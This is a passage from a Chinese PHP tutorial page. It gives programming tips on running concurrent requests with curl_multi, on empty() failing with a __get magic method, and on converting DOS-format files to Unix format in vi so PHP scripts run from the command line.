                $mrc = curl_multi_exec($mh, $active);  
            } while ($mrc == CURLM_CALL_MULTI_PERFORM);  

            while ($active &amp;&amp; $mrc == CURLM_OK) {  
                if (curl_multi_select($mh) != -1) {  
                    do {  
                        $mrc = curl_multi_exec($mh, $active);  
                    } while ($mrc == CURLM_CALL_MULTI_PERFORM);  
                }  
            }  
    //下面是处理请求返回的结果  
</code></pre>但如果我有1000个请求，那么curl批处理将并发1000个请求，显然是不合理，所以应该要控制一个并发数，并且将剩余的连接添加到请求队列里：参考：How to use curl_multi() without blocking
<p>代码如下:</p>
<pre>

<code>    &lt;?php
/*   php教程 www.512Pic.com   */
  
    $connomains = array(  
        //2.php自己去些  
       "http://localhost/2.php?id=1",//sleep(1)秒  
       "http://localhost/2.php?id=2",//sleep(2)秒  
       "http://localhost/2.php?id=5",//sleep(5)秒  
    );  

    $mh = curl_multi_init();  

    foreach ($connomains as $i =&gt; $url) {  
      $conn[$i] = curl_init($url);//初始化各个子连接  
      curl_setopt($conn[$i], CURLOPT_RETURNTRANSFER, 1);//不直接输出到浏览器  
      curl_multi_add_handle ($mh,$conn[$i]);//加入多处理句柄  
    }  

    $active = 0;//连接数  

    do {  
      do{  
          //这里$active会被改写成当前未处理数  
          //全部处理成功$active会变成0  
          $mrc  = curl_multi_exec($mh, $active);  

          //这个循环的目的是尽可能的读写，直到无法继续读写为止(返回CURLM_OK)  
          //返回(CURLM_CALL_MULTI_PERFORM)就表示还能继续向网络读写  
      }while($mrc==CURLM_CALL_MULTI_PERFORM);  

      
    //如果一切正常，那么我们要做一个轮询，每隔一定时间(默认是1秒)重新请求一次  
    //这就是curl_multi_select的作用,它在等待过程中，如果有就返回目前可以读写的句柄数量,以便  
    //继续读写操作,0则没有可以读写的句柄(完成了)  
    } while ($mrc==CURLM_OK&amp;&amp; $active &amp;&amp;curl_multi_select($mh)!=-1);//直到出错或者全部读写完毕  

    if ($mrc != CURLM_OK) {  
      print "Curl multi read error $mrc/n";  
    }  

    // retrieve data  
    foreach ($connomains as $i =&gt; $url) {  
      if (($err = curl_error($conn[$i])) == '') {  
       $res[$i]=curl_multi_getcontent($conn[$i]);  
      } else {  
       print "Curl error on handle $i: $err/n";  
      }  
      curl_multi_remove_handle($mh,$conn[$i]);  
      curl_close($conn[$i]);  
    }  
    curl_multi_close($mh);  

    print_r($res);  
    ?&gt;   
</code></pre>有的人为了省事，这样写:
<p></p>
<p>do { curl_multi_exec($mh,$active); } while ($active);</p>
<p>看似也能得到结果，但其实很不严谨，并且很浪费cpu，因为这个循环会一直在不停的调用，直到所有链接处理完毕，在循环里面加个print &#39;a&#39; 就可看出效果了。</p>
<p><strong>11、empty使用魔术方法__get判断对象属性是否为空不起作用</strong></p>
<p>Please note that results of empty() when called on non-existing / non-public variables of a class are a bit confusing if using magic method __get (as previously mentioned by nahpeps at gmx dot de). Consider this example:</p>
<p>代码如下:</p>
<pre>

<code>&lt;?php
/*   php教程 www.512Pic.com   */

class Registry
{
    protected $_items = array();
    public function __set($key, $value)
    {
        $this-&gt;_items[$key] = $value;
    }
    public function __get($key)
    {
        if (isset($this-&gt;_items[$key])) {
            return $this-&gt;_items[$key];
        } else {
            return null;
        }
    }
}</code></pre>
<p></p><code> </code>
<p><code>$registry = new Registry();$registry-&gt;empty = &#39;&#39;;$registry-&gt;notEmpty = &#39;not empty&#39;;</code></p><code> </code>
<p><code>var_dump(empty($registry-&gt;notExisting)); // true, so far so goodvar_dump(empty($registry-&gt;empty)); // true, so far so goodvar_dump(empty($registry-&gt;notEmpty)); // true, .. say what?$tmp = $registry-&gt;notEmpty;var_dump(empty($tmp)); // false as expected?&gt;</code></p>12、Linux下命令行执行php文件的格式必须是unix。
<p></p>
<p>php ./test.php如果test.php是windos上传的，其格式可能是dos。然后运行该命令就报错：Could not open input file</p>
<p>我们可以在vi中使用:set ff来查看格式：</p>
<p>fileformat=dos</p>
<p>如果是dos格式,那么就要使用:set ff=unix来设置新格式</p>
<p>再使用:set ff来查看格式,可以看到已经是unix的格式了;</p>
<p>fileformat=unix</p>

<p>注：关于PHP编程注意的简单示例的内容就先介绍到这里，更多相关文章的可以留意</span>                                     
		    	</div>
		    	<div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>代码注释</div>
			    <div class="panel-content">
			    <span></span>                                     
		    	</div>

			</div>

			<!-- END ROW -->
			<div class="newsPage">
				<div class="newsPageTurn">
				    <span><a>上一篇</a><a href='/php/biji/111035.html'>php生成随机密码的三种示例</a><a>下一篇</a><a href='/php/biji/111064.html'>PHP输出时间差函数示例</a></span>
				</div>
			</div>
		</div>


<div id="author-box">
    <h3>作者：喵哥笔记</h3>
        <div class="author-info">
            <div class="author-avatar">
                <img src="/skin1/picture/01.jpg" alt="IDC笔记" class="avatar" width="64" height="64">
            </div>
        <div class="author-description">
            <p>学的不仅是技术，更是梦想！</p>
            <ul class="author-social follows nb">
            	<li>
                    <a target="_blank" href="/" title="IDC笔记">IDC笔记</a>
                </li>
            </ul>
        </div>
        <div class="clear"></div>
    </div>
</div>
<script>
var paras = document.getElementsByTagName("pre");
for ( var i=0;i<paras.length;i++ ) {
    paras[i].setAttribute("class","brush:php;toolbar:false");     
}
</script>
<!-- container-fluid -->
	</div>
<!-- content -->
	<footer class="footer">
	© 2020 IDC笔记 <i class="mdi mdi-heart text-danger"></i>. | 备案号：<a href="https://beian.miit.gov.cn/">辽ICP备18000516号</a>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?674585fbbd2294d3faf910f668ea91b4";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

	</footer>
</div>

</div>
<!-- END wrapper -->
<!-- jQuery  -->
<script src="/skin1/js/jquery.min.js"></script>
<script src="/skin1/js/bootstrap.bundle.min.js"></script>
<script src="/skin1/js/metismenu.min.js"></script>
<script src="/skin1/js/jquery.slimscroll.js"></script>
<script src="/skin1/js/waves.min.js"></script>
<!--Morris Chart-->
<script src="/skin1/js/morris.min.js"></script>
<script src="/skin1/js/raphael.min.js"></script>
<script src="/skin1/js/dashboard.init.js"></script>
<script src="/skin1/js/app.js"></script>
<script src="/foot.js"></script>
</body>
</html>